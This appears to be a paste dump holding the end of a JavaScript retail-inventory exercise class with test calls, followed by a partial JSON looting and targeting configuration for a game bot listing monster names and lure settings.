            const res = [];
            result.forEach(el => res.push(`${el.productName}-${el.qty} pieces`));
            return res.join(', ');
        } else {
            return `There are no products available in that size`;
        }
    }

    listProducts() {
        const buff = `${this.storehouse} storehouse in ${this.location} available products:\n`;
        const sorted = this.productStock.sort((a, b) => a.productName.localeCompare(b.productName));
        const res = [];
        if (this.productStock.length == 0) {
            return `${this.storehouse} storehouse is empty`;
        } else {
            sorted.forEach(el => res.push(`${el.productName}/Size:${el.size}/Quantity:${el.qty}/Price:${el.price}$`))
            return buff + res.join('\n');
        }
    }
}

// const storeHouse = new FashionRetailInventory(""East"", ""Milano"");
// console.log(storeHouse.addProduct(""Shirt"", ""M"", 10, 25.0));
// console.log(storeHouse.addProduct(""T-Shirt"", ""M"", 10, 25.0));
// console.log(storeHouse.addProduct(""Sweather"", ""M"", 10, 25.0));
// console.log(storeHouse.addProduct(""Sweather"", ""M"", 10, 25.0));

// const storeHouse = new FashionRetailInventory(""East"", ""Milano"");
// console.log(storeHouse.addProduct(""Shirt"", ""M"", 10, 25.0));
// console.log(storeHouse.addProduct(""T-Shirt"", ""M"", 10, 25.0));
// console.log(storeHouse.sendProduct(""T-Shirt"", ""M""));
// console.log(storeHouse.sendProduct(""Sweather"", ""M""));

// const storeHouse = new FashionRetailInventory(""East"", ""Milano"");
// console.log(storeHouse.addProduct(""Shirt"", ""M"", 10, 25.0));
// console.log(storeHouse.addProduct(""T-Shirt"", ""M"", 10, 25.0));
// console.log(storeHouse.findProductsBySize(""M""));
// console.log(storeHouse.findProductsBySize(""XL""));

// console.log(storeHouse.listProducts());

const storeHouse = new FashionRetailInventory(""East"", ""Milano"");
console.log(storeHouse.addProduct(""Shirt"", ""M"", 10, 25.0));
console.log(storeHouse.addProduct(""T-Shirt"", ""M"", 10, 25.0));
console.log(storeHouse.addProduct(""Shirt"", ""L"", 5, 30.0));
console.log(storeHouse.addProduct(""Shoes"", ""9"", 8, 50.0));
console.log(storeHouse.sendProduct(""Shoes"", ""9"", 8, 50.0));
console.log(storeHouse.listProducts());

"
v1eNffen,Yff,Gruzing,Lua,Wednesday 7th of February 2024 01:35:44 PM CDT,"{
  ""looting"": {
    ""containers"": [

    ],
    ""maxDanger"": 10,
    ""minCapacity"": 0,
    ""items"": [
      {
        ""count"": 1,
        ""id"": 5904
      },
      {
        ""count"": 1,
        ""id"": 3595
      },
      {
        ""count"": 2,
        ""id"": 6548
      },
      {
        ""count"": 8,
        ""id"": 3043
      },
      {
        ""count"": 1,
        ""id"": 3364
      },
      {
        ""count"": 1,
        ""id"": 3414
      },
      {
        ""count"": 1,
        ""id"": 3366
      },
      {
        ""count"": 1,
        ""id"": 3048
      },
      {
        ""count"": 1,
        ""id"": 7382
      },
      {
        ""count"": 1,
        ""id"": 3555
      },
      {
        ""count"": 1,
        ""id"": 3388
      },
      {
        ""count"": 1,
        ""id"": 3278
      }
    ],
    ""everyItem"": false
  },
  ""targeting"": [
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^wyladowanie$|^spektator$|^rozladowanie$|^nessie$|^junok$|^amok$|^plugastwo$|^lilith$|^wykleta$|^cp guard$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 6,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 322,
      ""dynamicLure"": false,
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 4,
      ""name"": ""wyladowanie, spektator, rozladowanie, nessie, junok, amok, plugastwo, lilith, wykleta, cp guard"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^abyss$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 538,
      ""dynamicLure"": true,
      ""lureMax"": 6,
      ""lureMin"": 4,
      ""delayFrom"": 6,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 5,
      ""name"": ""abyss"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^atrox$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""atrox"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^mr snowman$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""Mr Snowman"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^daily troll$|^daily swamp troll$|^daily island troll$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": true,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""daily troll, daily swamp troll, daily island troll"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^grog$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 200,
      ""dynamicLure"": true,
      ""lureMax"": 9,
      ""lureMin"": 1,
      ""delayFrom"": 4,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""grog"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^piromanta$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": true,
      ""lureMax"": 6,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""rePositionAmount"": 5,
      ""name"": ""piromanta"",
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""dynamicLureDelay"": true,
      ""dontLoot"": true
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^bagienna hydra$"",
      ""name"": ""bagienna hydra"",
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""danger"": 1,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""dynamicLure"": true,
      ""lureDelay"": 300,
      ""dynamicLureDelay"": true,
      ""lureMax"": 5,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""maxDistance"": 10,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""faceMonster"": false,
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^kosciany smok$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 267,
      ""dynamicLure"": true,
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""delayFrom"": 5,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""kosciany smok"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^cylerian$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""cylerian"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^zle oko$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""zle oko"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^abitanski topornik$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""abitanski topornik"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^young earth stone$|^young fire stone$|^young ice stone$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""young earth stone, young fire stone, young ice stone"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^earth stone$|^fire stone$|^ice stone$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""earth stone, fire stone, ice stone"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^boruta$|^bekart wojny$|^rokita$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""boruta, bekart wojny, rokita"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^mateo$|^clockwork$|^demoniczny pomiot$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""mateo, clockwork, demoniczny pomiot"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^risem$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": true,
      ""lureMax"": 6,
      ""lureMin"": 2,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""risem"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^evil grog$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""danger"": 1,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""maxDistance"": 10,
      ""lureDelay"": 250,
      ""dynamicLure"": true,
      ""lureMax"": 17,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""evil grog"",
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^kosciany smok$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 360,
      ""dynamicLure"": true,
      ""lureMax"": 9,
      ""lureMin"": 1,
      ""delayFrom"": 3,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""kosciany smok"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^ancient dragon$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""dynamicLure"": true,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""maxDistance"": 10,
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""ancient dragon"",
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^[farm] fhern$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""[FARM] Fhern"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^ghazbaran$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""ghazbaran"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^hero$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""hero"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^piekielny ogar$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 150,
      ""dynamicLure"": true,
      ""lureMax"": 7,
      ""lureMin"": 2,
      ""delayFrom"": 4,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""rePositionAmount"": 4,
      ""name"": ""Piekielny Ogar"",
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 4,
      ""regex"": ""^rokita$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": true,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""Rokita"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 1,
      ""keepDistanceRange"": 1,
      ""regex"": ""^ymirson$|^hrimtur$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 6,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 545,
      ""dynamicLure"": true,
      ""lureMax"": 4,
      ""lureMin"": 1,
      ""delayFrom"": 4,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""Ymirson, Hrimtur"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 3,
      ""regex"": ""^fardos$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": true,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 3,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 2,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""fardos"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^daily toad$|^daily terror bird$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""daily toad, daily terror bird"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^diceros$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""diceros"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^volt$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 270,
      ""dynamicLure"": true,
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""volt"",
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^aniol$|^archaniol$|^upadly aniol$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""maxDistance"": 10,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 430,
      ""dynamicLure"": false,
      ""lureMax"": 7,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 1,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""dontLoot"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""aniol, archaniol, upadly aniol"",
      ""rePositionAmount"": 6
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^risem$"",
      ""name"": ""risem"",
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""dynamicLure"": true,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""danger"": 1,
      ""lureDelay"": 342,
      ""maxDistance"": 10,
      ""lureMax"": 7,
      ""lureMin"": 1,
      ""delayFrom"": 3,
      ""dynamicLureDelay"": true,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dontLoot"": false,
      ""faceMonster"": false,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""priority"": 2,
      ""rePositionAmount"": 5
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^holy$|^death$|^physical$|^hades$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""danger"": 1,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""maxDistance"": 10,
      ""lureDelay"": 100,
      ""dynamicLure"": true,
      ""lureMax"": 5,
      ""lureMin"": 1,
      ""delayFrom"": 1,
      ""priority"": 0,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": true,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""holy, death, physical, hades"",
      ""dontLoot"": true
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^killer$|^crusher$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
      ""avoidAttacks"": false,
      ""chase"": true,
      ""anchor"": false,
      ""lure"": false,
      ""keepDistance"": false,
      ""danger"": 2,
      ""closeLureAmount"": 3,
      ""rpSafe"": false,
      ""maxDistance"": 10,
      ""lureDelay"": 250,
      ""dynamicLure"": false,
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""delayFrom"": 2,
      ""priority"": 3,
      ""closeLure"": false,
      ""rePosition"": false,
      ""dynamicLureDelay"": false,
      ""rePositionAmount"": 5,
      ""lureCavebot"": false,
      ""lureCount"": 1,
      ""name"": ""killer, crusher"",
      ""dontLoot"": false
    },
    {
      ""anchorRange"": 3,
      ""keepDistanceRange"": 1,
      ""regex"": ""^elite diceros$"",
      ""faceMonster"": false,
      ""diamondArrows"": false,
